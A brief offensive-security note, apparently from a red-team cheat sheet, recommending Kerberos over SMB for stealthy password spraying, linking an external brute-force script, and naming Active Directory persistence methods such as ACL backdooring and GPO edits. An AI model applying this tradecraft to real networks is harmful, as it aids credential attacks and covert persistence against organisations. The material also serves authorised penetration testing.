Kerberos is **OPSEC SAFE** for password spraying compared to SMB. [This Script](https://gist.githubusercontent.com/ropnop/c53bb27678b68435c5537057c585736c/raw/25f11866d981d0c6667d3c59ece2817ff5663fb8/kinit_user_brute.sh) can be used.  

### Persisting in Active Directory  

Best methods are ACL Backdooring, edit existing GPOS or edit user objects (best option).  



